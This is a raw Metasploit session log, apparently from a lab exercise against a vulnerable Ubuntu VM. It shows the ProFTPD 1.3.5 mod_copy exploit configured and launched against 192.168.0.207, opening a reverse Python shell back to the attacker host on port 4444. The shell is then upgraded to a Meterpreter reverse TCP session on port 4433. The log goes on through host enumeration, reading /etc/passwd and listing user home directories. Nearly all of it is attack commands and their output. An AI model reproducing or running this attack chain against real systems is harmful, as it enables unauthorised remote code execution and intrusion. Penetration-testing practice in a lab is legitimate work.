```console
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > show options

Module options (exploit/unix/ftp/proftpd_modcopy_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     192.168.0.207    yes       The target host(s), see https://docs.metasploit.com/docs/usi
                                         ng-metasploit/basics/using-metasploit.html
   RPORT      80               yes       HTTP port (TCP)
   RPORT_FTP  21               yes       FTP port
   SITEPATH   /var/www/html    yes       Absolute writable website path
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base path to the website
   TMPPATH    /tmp             yes       Absolute writable path
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_python):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.0.156    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port
   SHELL  /bin/sh          yes       The system shell to use


Exploit target:

   Id  Name
   --  ----
   0   ProFTPD 1.3.5
```

```console
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > exploit
[*] Started reverse TCP handler on 192.168.0.156:4444 
[*] 192.168.0.207:80 - 192.168.0.207:21 - Connected to FTP server
[*] 192.168.0.207:80 - 192.168.0.207:21 - Sending copy commands to FTP server
[*] 192.168.0.207:80 - Executing PHP payload /SPkWnJ.php
[+] 192.168.0.207:80 - Deleted /var/www/html/SPkWnJ.php
[*] Command shell session 3 opened (192.168.0.156:4444 -> 192.168.0.207:37890) at 2025-03-06 10:22:46 -0500

whoami
www-data
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
hostname
ubuntu
uname -a
Linux ubuntu 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
pwd
/var/www/html
```

```console
msf6 post(multi/manage/shell_to_meterpreter) > show info

       Name: Shell to Meterpreter Upgrade
     Module: post/multi/manage/shell_to_meterpreter
   Platform: Linux, OSX, Unix, Solaris, BSD, Windows
       Arch: 
       Rank: Normal

Provided by:
  Tom Sellers <tom@fadedcode.net>

Compatible session types:
  Meterpreter
  Shell

Basic options:
  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
  LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
  LPORT    4433             yes       Port for payload to connect to.
  SESSION  3                yes       The session to run this module on

Description:
  This module attempts to upgrade a command shell to meterpreter. The shell
  platform is automatically detected and the best version of meterpreter for
  the target is selected. Currently meterpreter/reverse_tcp is used on Windows
  and Linux, with 'python/meterpreter/reverse_tcp' used on all others.


View the full module info with the info -d command.

msf6 post(multi/manage/shell_to_meterpreter) > run
[*] Upgrading session ID: 3
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.168.0.156:4433 
[*] Sending stage (1017704 bytes) to 192.168.0.207
[*] Command stager progress: 100.00% (773/773 bytes)
[*] Post module execution completed
```


```
msf6 post(multi/manage/shell_to_meterpreter) > sessions -l

Active sessions
===============

  Id  Name  Type                   Information               Connection
  --  ----  ----                   -----------               ----------
  3         shell cmd/unix                                   192.168.0.156:4444 -> 192.168.0.207:37890 (192.168.0.207)
  4         meterpreter x86/linux  www-data @ 192.168.0.207  192.168.0.156:4433 -> 192.168.0.207:53807 (192.168.0.207)

msf6 post(multi/manage/shell_to_meterpreter) > sessions 4
[*] Starting interaction with 4...

meterpreter > sysinfo
Computer     : 192.168.0.207
OS           : Ubuntu 14.04 (Linux 3.13.0-24-generic)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter > getuid
Server username: www-data


meterpreter > cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:106::/var/run/dbus:/bin/false
sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
statd:x:104:65534::/var/lib/nfs:/bin/false
vagrant:x:900:900:vagrant,,,:/home/vagrant:/bin/bash
dirmngr:x:105:111::/var/cache/dirmngr:/bin/sh
leia_organa:x:1111:100::/home/leia_organa:/bin/bash
luke_skywalker:x:1112:100::/home/luke_skywalker:/bin/bash
han_solo:x:1113:100::/home/han_solo:/bin/bash
artoo_detoo:x:1114:100::/home/artoo_detoo:/bin/bash
c_three_pio:x:1115:100::/home/c_three_pio:/bin/bash
ben_kenobi:x:1116:100::/home/ben_kenobi:/bin/bash
darth_vader:x:1117:100::/home/darth_vader:/bin/bash
anakin_skywalker:x:1118:100::/home/anakin_skywalker:/bin/bash
jarjar_binks:x:1119:100::/home/jarjar_binks:/bin/bash
lando_calrissian:x:1120:100::/home/lando_calrissian:/bin/bash
boba_fett:x:1121:100::/home/boba_fett:/bin/bash
jabba_hutt:x:1122:100::/home/jabba_hutt:/bin/bash
greedo:x:1123:100::/home/greedo:/bin/bash
chewbacca:x:1124:100::/home/chewbacca:/bin/bash
kylo_ren:x:1125:100::/home/kylo_ren:/bin/bash
mysql:x:106:112:MySQL Server,,,:/nonexistent:/bin/false
avahi:x:107:114:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
colord:x:108:116:colord colour management daemon,,,:/var/lib/colord:/bin/false
```


```
meterpreter > cd /home
meterpreter > ls
Listing: /home
==============

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040755/rwxr-xr-x  4096  dir   2020-10-29 15:39:01 -0400  anakin_skywalker
040755/rwxr-xr-x  4096  dir   2020-10-29 15:38:54 -0400  artoo_detoo
040755/rwxr-xr-x  4096  dir   2020-10-29 15:26:38 -0400  ben_kenobi
040755/rwxr-xr-x  4096  dir   2020-10-29 15:26:38 -0400  boba_fett
040755/rwxr-xr-x  4096  dir   2020-10-29 15:26:38 -0400  c_three_pio
040755/rwxr-xr-x  4096  dir   2020-10-29 15:26:39 -0400  chewbacca
040755/rwxr-xr-x  4096  dir   2020-10-29 15:26:38 -0400  darth_vader
040755/rwxr-xr-x  4096  dir   2020-10-29 15:26:38 -0400  greedo
040755/rwxr-xr-x  4096  dir   2020-10-29 15:26:38 -0400  han_solo
040755/rwxr-xr-x  4096  dir   2020-10-29 15:26:38 -0400  jabba_hutt
040755/rwxr-xr-x  4096  dir   2020-10-29 15:26:38 -0400  jarjar_binks
040755/rwxr-xr-x  4096  dir   2020-10-29 15:39:01 -0400  kylo_ren
040755/rwxr-xr-x  4096  dir   2020-10-29 15:26:38 -0400  lando_calrissian
040755/rwxr-xr-x  4096  dir   2020-10-29 15:26:38 -0400  leia_organa
040755/rwxr-xr-x  4096  dir   2020-10-29 15:26:38 -0400  luke_skywalker
040755/rwxr-xr-x  4096  dir   2025-02-25 16:01:39 -0500  vagrant
```